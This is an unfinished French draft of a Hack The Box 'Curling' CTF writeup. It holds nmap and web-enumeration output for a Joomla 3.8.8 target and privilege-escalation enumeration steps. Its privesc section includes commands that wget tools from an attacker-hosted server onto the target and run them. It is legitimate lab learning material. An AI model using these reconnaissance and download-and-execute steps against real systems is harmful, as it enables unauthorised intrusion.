---
# === Archetype writeups – v1 (stable) ===
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

# H1 SEO (via title, pas dans le markdown)
title: "Curling — HTB Easy Writeup & Walkthrough"
linkTitle: "Curling"
slug: "curling"
date: 2026-05-15T10:46:41+02:00
#lastmod: 2026-05-15T10:46:41+02:00
draft: true

# --- PaperMod / navigation ---
type: "writeups"
summary: "Summary générique de machine CTF"
description: "Description générique de machine CTF"
tags: ["Hack The Box","HTB Easy","linux-privesc"]
categories: ["Mes writeups"]

# Ajouter ensuite uniquement des tags techniques réellement utilisés dans le writeup,
# par exemple :
# - prise de pied : "Web", "SSH", "FTP"
# - faille : "XSS", "LFI", "RCE", "Path Traversal", "Shellshock"
# - techno / produit : "Grafana", "Chamilo", "CMS Made Simple", "js2py"
# - CVE : "CVE-2021-43798"
# - pivot : "Credential Reuse"
# - privesc spécifique : "sudo", "Docker", "Cron", "ACL", "PATH Hijacking", "tmux", "npbackup", "pspy64"

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Curling"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Curling"
  difficulty: "Easy | Medium | Hard"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web","Privilege Escalation"]
  time_spent: "2h"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true

# --- SEO Reminders (à compléter après création) ---
# 1) Titre :
#    - Doit contenir : Nom Machine + HTB Easy + Writeup
# 2) Description :
#    - Résumé 130–160 caractères
#    - Style “Mix Parfait” : pédagogique + technique
#    - Exemple : "Writeup de <machine> (HTB Easy) : énumération claire, analyse de la vulnérabilité et escalade structurée."
# 3) ALT (image de couverture) :
#    - Mixer vulnérabilité + pédagogie + progression
#    - Exemple : "Machine <machine> HTB Easy vulnérable à <faille>, expliquée étape par étape jusqu'à l'escalade."
# 4) Tags :
#    - Toujours ["Easy"]
#    - Ajouter d'autres selon le thème : ["web","shellshock","heartbleed","enum"]
# 5) Structure :
#    - H1 = titre
#    - Description = meta description + preview social
#    - ALT = SEO image + accessibilité

# --- SEO CHECKLIST (à valider avant publication) ---

# [ ] 1) Titre (title + H1)
#     - Contient : Nom Machine + HTB Easy + Writeup
#     - Unique sur le site
#     - Lisible hors contexte HTB

# [ ] 2) Description (meta)
#     - 130–160 caractères
#     - Pas générique
#     - Ton pédagogique + technique
#     - Exemple :
#       "Writeup de <machine> (HTB Easy) : énumération claire,
#        compréhension de la vulnérabilité et escalade structurée."

# [ ] 3) Image de couverture
#     - Présente (ou fallback)
#     - Nom explicite
#     - Dimensions cohérentes

# [ ] 4) ALT de l’image
#     - Décrit la machine + l’approche
#     - Pédagogique (pas juste technique)
#     - Exemple :
#       "Machine <machine> HTB Easy exploitée étape par étape,
#        de l’énumération à l’escalade de privilèges."

# [ ] 5) Tags
#     - Toujours inclure la difficulté (ex: "Easy")
#     - Ajouter uniquement des tags techniques réels

# [ ] 6) Structure du contenu
#     - Un seul H1
#     - Sections claires et hiérarchisées
#     - Pas de sections SEO artificielles

---

<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Curling> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

- Contexte (source, thème, objectif).
- Hypothèses initiales (services attendus, techno probable).
- Objectifs : obtenir `user.txt` puis `root.txt`.

---

## Énumération

{{< enum-intro >}}

### Scan initial

Le scan TCP complet (`scans_nmap/full_tcp_scan.txt`) montre les ports ouverts suivants :

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt curling.htb
Nmap scan report for curling.htb (10.129.x.x)
Host is up (0.021s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at [date]-- 1 IP address (1 host up) scanned in 7.32 seconds

```

### Scan FTP/SMB (si services détectés)

Après le scan initial, le script enchaîne automatiquement avec une phase d’énumération ciblée **FTP/SMB** si l’un des services suivants est détecté :

- **FTP** sur le port **21**
- **SMB** sur le port **139** et/ou **445**

Les résultats sont enregistrés dans (`scans_nmap/enum_ftp_smb_scan.txt`) :

```bash
# mon-nmap — ENUM FTP / SMB
# Target : curling.htb
# Date   : [date]

Aucun service FTP (21) ni SMB (139/445) détecté.
Ports ouverts détectés : 22,80
```



### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.

Ce scan fournit des informations détaillées sur les services et versions détectés.

Les résultats sont enregistrés dans (`scans_nmap/aggressive_vuln_scan.txt`) :

```bash
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour curling.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"22,80" --script="(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "curling.htb"

# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,80 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt curling.htb
Nmap scan report for curling.htb (10.129.x.x)
Host is up (0.012s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   63.47 ms 10.10.16.1
2   7.86 ms  curling.htb (10.129.x.x)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 15.25 seconds
```



### Scan ciblé CMS

Le script exécute ensuite un scan ciblé CMS (scans_nmap/cms_vuln_scan.txt).

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,80 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt curling.htb
Nmap scan report for curling.htb (10.129.x.x)
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; php: 1
|     /index.php/2-uncategorised/
|       Other: 3
|     /index.php/component/users/
|       Other: 1
|     /media/jui/js/
|       js: 4
|     /media/system/js/
|       js: 4
|     /templates/protostar/
|       ico: 1
|     /templates/protostar/js/
|       js: 1
|   Longest directory structure:
|     Depth: 3
|     Dir: /media/system/js/
|   Total files found (by extension):
|_    Other: 5; ico: 1; js: 9; php: 1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
|_http-devframework: Joomla detected. Found common traces on /
| http-headers: 
|   Date: Fri, 15 May 2026 08:50:53 GMT
|   Server: Apache/2.4.29 (Ubuntu)
|   Set-Cookie: c0548020854924e0aecd05ed9f5b672b=32pdgvpr1mj722s5jt1g7m4rlg; path=/; HttpOnly
|   Expires: Wed, 17 Aug 2005 00:00:00 GMT
|   Last-Modified: Fri, 15 May 2026 08:50:53 GMT
|   Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
|   Pragma: no-cache
|   Connection: close
|   Content-Type: text/html; charset=utf-8
|   
|_  (Request type: HEAD)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-enum: 
|   /administrator/: Possible admin folder
|   /administrator/index.php: Possible admin folder
|   /administrator/manifests/files/joomla.xml: Joomla version 3.8.8
|   /language/en-GB/en-GB.xml: Joomla version 3.8.8
|   /htaccess.txt: Joomla!
|   /README.txt: Interesting, a readme.
|   /bin/: Potentially interesting folder
|   /cache/: Potentially interesting folder
|   /images/: Potentially interesting folder
|   /includes/: Potentially interesting folder
|   /libraries/: Potentially interesting folder
|   /modules/: Potentially interesting folder
|   /templates/: Potentially interesting folder
|_  /tmp/: Potentially interesting folder
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 37.71 seconds

```



### Scan UDP rapide

Le script lance également un scan UDP rapide afin de détecter d’éventuels services supplémentaires (`scans_nmap/udp_vuln_scan.txt`) :

```bash
# Nmap 7.99 scan initiated [date]6 as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt curling.htb
Warning: 10.129.x.x giving up on port because retransmission cap hit (6).
Nmap scan report for curling.htb (10.129.x.x)
Host is up (0.012s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   open|filtered snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  open|filtered upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 11.92 seconds
```



### Énumération des chemins web
Pour la découverte des chemins web, tu peux utiliser le script dédié {{< script "mon-recoweb" >}}

```bash
mon-recoweb curling.htb

# Résultats dans le répertoire scans_recoweb/
#  - scans_recoweb/RESULTS_SUMMARY.txt     ← vue d’ensemble des découvertes
#  - scans_recoweb/dirb.log
#  - scans_recoweb/dirb_hits.txt
#  - scans_recoweb/ffuf_dirs.txt
#  - scans_recoweb/ffuf_dirs_hits.txt
#  - scans_recoweb/ffuf_files.txt
#  - scans_recoweb/ffuf_files_hits.txt
#  - scans_recoweb/ffuf_dirs.json
#  - scans_recoweb/ffuf_files.json

```

Le fichier `RESULTS_SUMMARY.txt`  regroupe les chemins découverts, sans parcourir l’ensemble des logs générés.

```bash
===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
Script              : mon-recoweb v2.2.3

Cible        : curling.htb
Périmètre    : /
Date début   : [date]

Commandes exécutées (exactes) :

[dirb — découverte initiale]
dirb http://curling.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/curling.htb/dirb.log

[ffuf — énumération des répertoires]
ffuf -u http://curling.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/curling.htb/ffuf_dirs.json 2>&1 | tee scans_recoweb/curling.htb/ffuf_dirs.log

[ffuf — énumération des fichiers]
ffuf -u http://curling.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/curling.htb/ffuf_files.json 2>&1 | tee scans_recoweb/curling.htb/ffuf_files.log

Processus de génération des résultats :
- Les sorties JSON produites par ffuf constituent la source de vérité.
- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
- Les résultats sont normalisés sous la forme :
    http://cible/chemin (CODE:xxx|SIZE:yyy)
- Les chemins sont ensuite classés par type :
    • répertoires (/chemin/)
    • fichiers (/chemin.ext)
- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
  garantissant la reproductibilité complète du scan.

----------------------------------------------------

=== Résultat global (agrégé) ===

http://curling.htb/administrator/
http://curling.htb/administrator/ (CODE:301|SIZE:318)
http://curling.htb/bin/
http://curling.htb/bin/ (CODE:301|SIZE:308)
http://curling.htb/cache/
http://curling.htb/cache/ (CODE:301|SIZE:310)
http://curling.htb/cli/ (CODE:301|SIZE:308)
http://curling.htb/. (CODE:200|SIZE:14249)
http://curling.htb/components/
http://curling.htb/components/ (CODE:301|SIZE:315)
http://curling.htb/configuration.php (CODE:200|SIZE:0)
http://curling.htb/.htaccess.bak (CODE:403|SIZE:276)
http://curling.htb/.htaccess (CODE:403|SIZE:276)
http://curling.htb/htaccess.txt (CODE:200|SIZE:3005)
http://curling.htb/.htc (CODE:403|SIZE:276)
http://curling.htb/.ht (CODE:403|SIZE:276)
http://curling.htb/.htgroup (CODE:403|SIZE:276)
http://curling.htb/.htm (CODE:403|SIZE:276)
http://curling.htb/.html (CODE:403|SIZE:276)
http://curling.htb/.htpasswd (CODE:403|SIZE:276)
http://curling.htb/.htpasswds (CODE:403|SIZE:276)
http://curling.htb/.htuser (CODE:403|SIZE:276)
http://curling.htb/images/
http://curling.htb/images/ (CODE:301|SIZE:311)
http://curling.htb/includes/
http://curling.htb/includes/ (CODE:301|SIZE:313)
http://curling.htb/index.php (CODE:200|SIZE:14269)
http://curling.htb/language/
http://curling.htb/language/ (CODE:301|SIZE:313)
http://curling.htb/layouts/
http://curling.htb/layouts/ (CODE:301|SIZE:312)
http://curling.htb/libraries/
http://curling.htb/libraries/ (CODE:301|SIZE:314)
http://curling.htb/LICENSE.txt (CODE:200|SIZE:18092)
http://curling.htb/media/
http://curling.htb/media/ (CODE:301|SIZE:310)
http://curling.htb/modules/
http://curling.htb/modules/ (CODE:301|SIZE:312)
http://curling.htb/.php (CODE:403|SIZE:276)
http://curling.htb/plugins/
http://curling.htb/plugins/ (CODE:301|SIZE:312)
http://curling.htb/README.txt (CODE:200|SIZE:4872)
http://curling.htb/server-status (CODE:403|SIZE:276)
http://curling.htb/server-status/ (CODE:403|SIZE:276)
http://curling.htb/templates/
http://curling.htb/templates/ (CODE:301|SIZE:314)
http://curling.htb/tmp/
http://curling.htb/tmp/ (CODE:301|SIZE:308)
http://curling.htb/wp-forum.phps (CODE:403|SIZE:276)

=== Détails par outil ===

[DIRB]
http://curling.htb/administrator/
http://curling.htb/bin/
http://curling.htb/cache/
http://curling.htb/components/
http://curling.htb/images/
http://curling.htb/includes/
http://curling.htb/index.php (CODE:200|SIZE:14269)
http://curling.htb/language/
http://curling.htb/layouts/
http://curling.htb/libraries/
http://curling.htb/media/
http://curling.htb/modules/
http://curling.htb/plugins/
http://curling.htb/server-status (CODE:403|SIZE:276)
http://curling.htb/templates/
http://curling.htb/tmp/

[FFUF — DIRECTORIES]
http://curling.htb/administrator/ (CODE:301|SIZE:318)
http://curling.htb/bin/ (CODE:301|SIZE:308)
http://curling.htb/cache/ (CODE:301|SIZE:310)
http://curling.htb/cli/ (CODE:301|SIZE:308)
http://curling.htb/components/ (CODE:301|SIZE:315)
http://curling.htb/images/ (CODE:301|SIZE:311)
http://curling.htb/includes/ (CODE:301|SIZE:313)
http://curling.htb/language/ (CODE:301|SIZE:313)
http://curling.htb/layouts/ (CODE:301|SIZE:312)
http://curling.htb/libraries/ (CODE:301|SIZE:314)
http://curling.htb/media/ (CODE:301|SIZE:310)
http://curling.htb/modules/ (CODE:301|SIZE:312)
http://curling.htb/plugins/ (CODE:301|SIZE:312)
http://curling.htb/server-status/ (CODE:403|SIZE:276)
http://curling.htb/templates/ (CODE:301|SIZE:314)
http://curling.htb/tmp/ (CODE:301|SIZE:308)

[FFUF — FILES]
http://curling.htb/. (CODE:200|SIZE:14249)
http://curling.htb/configuration.php (CODE:200|SIZE:0)
http://curling.htb/.htaccess.bak (CODE:403|SIZE:276)
http://curling.htb/.htaccess (CODE:403|SIZE:276)
http://curling.htb/htaccess.txt (CODE:200|SIZE:3005)
http://curling.htb/.htc (CODE:403|SIZE:276)
http://curling.htb/.ht (CODE:403|SIZE:276)
http://curling.htb/.htgroup (CODE:403|SIZE:276)
http://curling.htb/.htm (CODE:403|SIZE:276)
http://curling.htb/.html (CODE:403|SIZE:276)
http://curling.htb/.htpasswd (CODE:403|SIZE:276)
http://curling.htb/.htpasswds (CODE:403|SIZE:276)
http://curling.htb/.htuser (CODE:403|SIZE:276)
http://curling.htb/index.php (CODE:200|SIZE:14269)
http://curling.htb/LICENSE.txt (CODE:200|SIZE:18092)
http://curling.htb/.php (CODE:403|SIZE:276)
http://curling.htb/README.txt (CODE:200|SIZE:4872)
http://curling.htb/wp-forum.phps (CODE:403|SIZE:276)

```



### Recherche de vhosts

Enfin, tu peux tester la présence de vhosts à l’aide du script {{< script "mon-subdomains" >}}.

```bash
=== mon-subdomains curling.htb START ===
Script       : mon-subdomains
Version      : mon-subdomains 2.0.1
Date         : [date]
Domaine      : curling.htb
IP           : 10.129.x.x
Mode         : large
Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
Codes        : 200,301,302,401,403  (strict=1)

VHOST totaux : 0
  - (aucun)

--- Détails par port ---
Port 80 (http)
  Baseline#1: code=200 size=14271 words=1051 (Host=ud2ojwcbje.curling.htb)
  Baseline#2: code=200 size=14271 words=1051 (Host=tjc7qkmr4g.curling.htb)
  Baseline#3: code=200 size=14271 words=1051 (Host=rqiizcjhw8.curling.htb)
  VHOST (0)
    - (fuzzing sauté : wildcard probable)
    - (explication : réponse identique quel que soit Host → vhost-fuzzing non discriminant)



=== mon-subdomains curling.htb END ===

```

Si aucun vhost distinct n’est identifié, ce fichier confirme l’absence de résultats supplémentaires.

## Prise pied

- Vecteur d'entrée confirmé (faille, creds, LFI/RFI, upload…).
- Payloads utilisés (extraits pertinents).
- Stabilisation du shell (pty, rlwrap, tmux…), preuve d'accès (`id`, `whoami`, `hostname`).

---

## Escalade de privilèges

{{< escalade-intro user="ssh_user" >}}

### Sudo -l
Tu commences toujours par vérifier les droits sudo :

### Exploration du contexte utilisateur

Avant d’aller plus loin, tu vérifies le contexte dans lequel tu te trouves :

```bash
whoami
id
pwd
uname -a
hostname
```

Résultat :

### Recherche de binaires SUID
Tu poursuis l’énumération en recherchant les **binaires SUID**, qui permettent parfois d’exécuter certaines commandes avec les privilèges de leur propriétaire.

```bash
find / -perm -4000 -type f 2>/dev/null
```

La liste obtenue ne contient que des binaires système classiques tels que :

```texte
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
...
```

Ces binaires sont classiques sur un système Linux et sont généralement présents par défaut.
Tu n’identifies aucun binaire inhabituel ou directement exploitable.

### Analyse des Linux capabilities

Tu vérifies ensuite si certains binaires disposent de **capabilities Linux**, qui permettent à un programme d’effectuer certaines actions privilégiées sans être exécuté en root ou via un binaire SUID.

La vérification se fait avec la commande suivante :

```bash
getcap -r / 2>/dev/null
```

Ici, tu ne trouves aucune capability inhabituelle ni aucun binaire exploitable.

### Vérification des SUID avec suid3num.py

Pour compléter l’analyse des binaires SUID, tu utilises l’outil suid3num.py, qui permet d’identifier rapidement :

les binaires SUID intéressants
leur présence éventuelle dans GTFOBins

Tu le télécharges et l’exécutes depuis un répertoire en mémoire (/dev/shm) :

```bash
cd /dev/shm
wget http://10.10.x.x:8000/suid3num.py
python3 suid3num.py
```
L’outil confirme que :

- tous les binaires SUID présents sont standards
- aucun binaire personnalisé n’est identifié
- aucun binaire exploitable via GTFOBins n’est détecté
  

Cette vérification confirme que la piste des SUID ne mène à rien dans ce cas précis.

### Inspection des tâches cron
Tu vérifies ensuite les **tâches planifiées (cron)**, car certains scripts exécutés automatiquement par le système peuvent être modifiables par un utilisateur et permettre une élévation de privilèges.

Les crons système peuvent être consultés avec :

```bash
cat /etc/crontab
```

### Analyse des services locaux
Tu vérifies ensuite les **services en cours d’exécution**, ce qui permet parfois d’identifier une application vulnérable ou un service mal configuré.

```
netstat -tulpn
```

### pspy64
Tu lances également pspy64 dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.

Tu le télécharges et l’exécutes depuis un répertoire persistant (/var/tmp) :

cd /var/tmp
wget http://10.10.x.x:8000/pspy64
chmod +x pspy64
./pspy64

L’objectif est d’identifier des tâches exécutées automatiquement par root pouvant être exploitables.

Dans ce cas précis, aucun processus exploitable n’apparaît dans cette deuxième session, même en redémarrant la première session SSH.

### Conclusion de l’énumération manuelle

### Analyse avec linpeas.sh
Dans **LinPEAS**, les vulnérabilités potentielles sont classées et surlignées par couleur.
![Légende des couleurs de LinPEAS indiquant le niveau de criticité des vulnérabilités](/images/linpeas-legend.png)

---

## Conclusion

- Récapitulatif de la chaîne d'attaque (du scan à root).
- Vulnérabilités exploitées & combinaisons.
- Conseils de mitigation et détection.
- Points d'apprentissage personnels.

---

## Pièces jointes (optionnel)

- Scripts, one-liners, captures, notes.  
- Arbo conseillée : `files/<nom_ctf>/…`

{{< feedback >}}